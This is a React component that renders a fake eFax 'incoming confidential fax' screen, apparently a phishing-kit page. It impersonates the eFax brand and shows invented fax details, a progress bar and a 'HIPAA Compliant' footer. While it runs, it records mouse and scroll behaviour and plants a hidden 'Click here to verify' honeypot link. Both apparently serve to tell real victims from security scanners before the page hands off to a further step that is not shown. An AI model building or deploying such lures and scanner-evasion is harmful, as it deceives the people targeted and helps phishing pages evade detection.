'use client'

import { useState, useEffect } from 'react'

interface LoadingScreenProps {
  duration: number
  language: string
  onComplete: () => void
  onBehaviorTracked: (data: any) => void
  onHoneypotTriggered: () => void
}

interface Translations {
  title: string
  subtitle: string
  incomingFax: string
  fromNumber: string
  toNumber: string
  pages: string
  receivedAt: string
  confidential: string
  converting: string
  footer: string
}

export default function EFaxScreen({
  duration,
  language,
  onComplete,
  onBehaviorTracked,
  onHoneypotTriggered
}: LoadingScreenProps) {
  const [progress, setProgress] = useState(0)
  const [translations, setTranslations] = useState<Translations | null>(null)
  const [scanAnimation, setScanAnimation] = useState(0)

  useEffect(() => {
    const fetchTranslations = async () => {
      try {
        const response = await fetch('/api/get-translations', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ template: 'eFax' })
        })
        const data = await response.json()
        setTranslations(data.translations)
      } catch (error) {
        setTranslations({
          title: 'eFaxSecure',
          subtitle: 'Professional Fax Service',
          incomingFax: 'Incoming Fax Document',
          fromNumber: 'From',
          toNumber: 'To',
          pages: 'Pages',
          receivedAt: 'Received',
          confidential: 'CONFIDENTIAL',
          converting: 'Converting to PDF...',
          footer: 'HIPAA Compliant · Secure'
        })
      }
    }
    fetchTranslations()
  }, [])

  useEffect(() => {
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval)
          onComplete()
          return 100
        }
        return prev + (100 / (duration * 10))
      })
    }, 100)

    const scanInterval = setInterval(() => {
      setScanAnimation(prev => (prev + 1) % 100)
    }, 30)

    const trackMouse = (e: MouseEvent) => onBehaviorTracked({ type: 'mouse', x: e.clientX, y: e.clientY })
    const trackScroll = () => onBehaviorTracked({ type: 'scroll', y: window.scrollY })
    window.addEventListener('mousemove', trackMouse)
    window.addEventListener('scroll', trackScroll)

    const honeypot = document.createElement('a')
    honeypot.href = '#'
    honeypot.style.position = 'absolute'
    honeypot.style.left = '-9999px'
    honeypot.textContent = 'Click here to verify'
    honeypot.addEventListener('click', (e) => {
      e.preventDefault()
      onHoneypotTriggered()
    })
    document.body.appendChild(honeypot)

    return () => {
      clearInterval(interval)
      clearInterval(scanInterval)
      window.removeEventListener('mousemove', trackMouse)
      window.removeEventListener('scroll', trackScroll)
      honeypot.remove()
    }
  }, [duration, onComplete, onBehaviorTracked, onHoneypotTriggered])

  if (!translations) {
    return (
      <div style={{ minHeight: '100vh', background: 'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <div style={{ width: '40px', height: '40px', border: '4px solid rgba(255,255,255,0.3)', borderTop: '4px solid white', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }} />
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    )
  }

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px'
    }}>
      <div style={{
        background: 'white',
        borderRadius: '24px',
        boxShadow: '0 30px 80px rgba(0,0,0,0.3)',
        padding: '60px 50px',
        maxWidth: '550px',
        width: '100%',
        position: 'relative',
        animation: 'slideUp 0.5s ease-out'
      }}>
        {/* Confidential Banner */}
        <div style={{
          position: 'absolute',
          top: '20px',
          right: '20px',
          background: 'linear-gradient(135deg, #fc4a1a 0%, #f7b733 100%)',
          color: 'white',
          fontSize: '11px',
          fontWeight: '800',
          padding: '6px 14px',
          borderRadius: '6px',
          letterSpacing: '1px',
          boxShadow: '0 4px 12px rgba(252, 74, 26, 0.4)',
          animation: 'pulse 2s ease-in-out infinite'
        }}>
          {translations.confidential}
        </div>

        {/* Fax Machine Icon with Scan Animation */}
        <div style={{
          width: '130px',
          height: '130px',
          margin: '0 auto 35px',
          position: 'relative'
        }}>
          <div style={{
            width: '100%',
            height: '100%',
            background: 'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)',
            borderRadius: '20px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '65px',
            boxShadow: '0 15px 40px rgba(79, 172, 254, 0.4)'
          }}>
            📠
          </div>
          
          {/* Scanning Line Animation */}
          <div style={{
            position: 'absolute',
            left: '10%',
            right: '10%',
            height: '3px',
            background: 'linear-gradient(90deg, transparent, #00f2fe, transparent)',
            top: `${scanAnimation}%`,
            transition: 'top 0.03s linear',
            boxShadow: '0 0 10px #00f2fe'
          }} />
        </div>

        {/* Title */}
        <h1 style={{
          fontSize: '26px',
          fontWeight: '700',
          color: '#1a202c',
          marginBottom: '10px',
          textAlign: 'center'
        }}>
          {translations.incomingFax}
        </h1>

        {/* Fax Details */}
        <div style={{
          background: 'linear-gradient(135deg, #f7fafc 0%, #edf2f7 100%)',
          borderRadius: '16px',
          padding: '25px',
          marginBottom: '30px',
          border: '1px solid #e2e8f0'
        }}>
          {[
            { label: translations.fromNumber, value: '+81-3-1234-5678' },
            { label: translations.toNumber, value: '+81-3-8765-4321' },
            { label: translations.pages, value: '3 pages' },
            { label: translations.receivedAt, value: 'Just now' }
          ].map((item, i) => (
            <div
              key={i}
              style={{
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center',
                padding: '12px 0',
                borderBottom: i < 3 ? '1px solid #e2e8f0' : 'none',
                animation: `fadeIn 0.5s ease-out ${i * 0.1}s both`
              }}
            >
              <span style={{ fontSize: '14px', color: '#718096', fontWeight: '500' }}>{item.label}</span>
              <span style={{ fontSize: '14px', fontWeight: '600', color: '#2d3748' }}>{item.value}</span>
            </div>
          ))}
        </div>

        {/* Progress Bar */}
        <div style={{ marginBottom: '20px' }}>
          <div style={{
            width: '100%',
            height: '8px',
            background: 'linear-gradient(90deg, #e2e8f0 0%, #cbd5e0 100%)',
            borderRadius: '10px',
            overflow: 'hidden',
            boxShadow: 'inset 0 2px 4px rgba(0,0,0,0.1)'
          }}>
            <div style={{
              width: `${progress}%`,
              height: '100%',
              background: 'linear-gradient(90deg, #4facfe 0%, #00f2fe 100%)',
              transition: 'width 0.3s ease',
              position: 'relative',
              boxShadow: '0 0 15px rgba(0, 242, 254, 0.6)'
            }}>
              <div style={{
                position: 'absolute',
                top: 0,
                left: '-100%',
                width: '100%',
                height: '100%',
                background: 'linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent)',
                animation: 'shimmer 1.5s infinite'
              }} />
            </div>
          </div>
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            marginTop: '10px'
          }}>
            <span style={{ fontSize: '13px', color: '#718096' }}>{translations.converting}</span>
            <span style={{ fontSize: '13px', color: '#4facfe', fontWeight: '700' }}>{Math.round(progress)}%</span>
          </div>
        </div>

        {/* Footer */}
        <div style={{
          marginTop: '30px',
          paddingTop: '25px',
          borderTop: '1px solid #e2e8f0',
          textAlign: 'center'
        }}>
          <span style={{ fontSize: '13px', color: '#a0aec0' }}>
            {translations.footer}
          </span>
        </div>
      </div>

      <style>{`
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes shimmer { to { left: 100%; } }
        @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
      `}</style>
    </div>
  )
}
